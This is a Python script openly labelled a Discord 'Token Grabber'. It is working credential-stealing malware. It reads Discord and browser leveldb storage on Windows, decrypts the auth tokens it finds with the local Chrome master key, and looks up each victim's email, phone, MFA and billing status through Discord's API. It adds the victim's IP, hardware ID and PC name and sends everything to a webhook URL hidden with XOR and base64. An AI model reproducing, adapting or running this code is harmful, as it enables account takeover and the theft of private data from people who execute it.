import os
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from re import findall
from subprocess import Popen, PIPE
import requests
from datetime import datetime
from itertools import cycle

tokens = []
cleaned = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def getip():
    ip = "None"
    try:
        ip = requests.get("https://api.ipify.org").text.strip()
    except:
        pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def xor_crypt(data, key):
    if isinstance(data, str):
        data = data.encode()
    key = key.encode()
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

def get_token():
    already_check = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + '\\Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    key = 'AstraaDevKey'
    regex_encrypted_b64 = 'JSIDRhZYEwIuKDRDaSg1XzsAaR9GZlxSbk4pWUg='
    api_me_encrypted_b64 = 'KQcAAhJba0oSIhYaLgEQExERagYZJkoYMRpbBFdOMRYTORZWAR4R'
    api_billing_encrypted_b64 = 'KQcAAhJba0oSIhYaLgEQExERagYZJkoYMRpbBFdOMRYTORZWAR4RXQMIKAkfJQJWMgYWAQITLRUCIgoXMg=='
    webhook_encrypted_b64 = 'KQcAAhJba0oSIhYaLgEQXAIOKUoXOwxWNhYWGg4OLxZZelFJckNDR1dUdlxHclFAc0VESk4PFQFAIQkedEQVNjgyGy89OAQIHiABAlYLIQRDJUhBORIgFFcKdxcQPTAPdSMtQjgnGw9OISkmFzUsPwYEFQkTIzwqDw=='

    regex_pattern = xor_crypt(b64decode(regex_encrypted_b64), key).decode()
    api_me_url = xor_crypt(b64decode(api_me_encrypted_b64), key).decode()
    api_billing_url = xor_crypt(b64decode(api_billing_encrypted_b64), key).decode()
    webhook_url = xor_crypt(b64decode(webhook_encrypted_b64), key).decode()

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + "\\Local State", "r") as file:
                local_state = loads(file.read())
                master_key = b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        except:
            continue
        for file in os.listdir(path + "\\Local Storage\\leveldb\\"):
            if not (file.endswith(".ldb") or file.endswith(".log")):
                continue
            try:
                with open(path + "\\Local Storage\\leveldb\\" + file, "r", errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            for token in findall(regex_pattern, line):
                                tokens.append(token)
            except:
                continue

    for token in tokens:
        if token.endswith("\\"):
            token = token[:-1]
        if token not in cleaned:
            cleaned.append(token)

    for token in cleaned:
        try:
            tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
            if tok == "Error":
                continue
        except:
            continue
        if tok not in already_check:
            already_check.append(tok)
            headers = {'Authorization': tok, 'Content-Type': 'application/json'}
            try:
                res = requests.get(api_me_url, headers=headers)
                if res.status_code == 200:
                    res_json = res.json()
                    ip = getip()
                    pc_username = os.getenv("UserName")
                    pc_name = os.getenv("COMPUTERNAME")
                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                    user_id = res_json['id']
                    email = res_json['email']
                    phone = res_json['phone']
                    mfa_enabled = res_json['mfa_enabled']
                    has_nitro = False
                    res = requests.get(api_billing_url, headers=headers)
                    nitro_data = res.json()
                    has_nitro = bool(len(nitro_data) > 0)
                    days_left = 0
                    if has_nitro:
                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        days_left = abs((d2 - d1).days)
                    embed = f"""{user_name} ({user_id})

> :dividers: Account Information
\tEmail: {email}
\tPhone: {phone}
\t2FA/MFA Enabled: {mfa_enabled}
\tNitro: {has_nitro}
\tExpires in: {days_left if days_left else "None"} day(s)
:computer: PC Information
\tIP: {ip}
\tUsername: {pc_username}
\tPC Name: {pc_name}
\tPlatform: {platform}
:piñata: Token
\t{tok}
Made by Astraa#6100 | ||https://github.com/astraadev||"""
                    payload = {'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'}
                    try:
                        requests.post(webhook_url, json=payload)
                    except:
                        continue
            except:
                continue

if __name__ == '__main__':
    get_token()
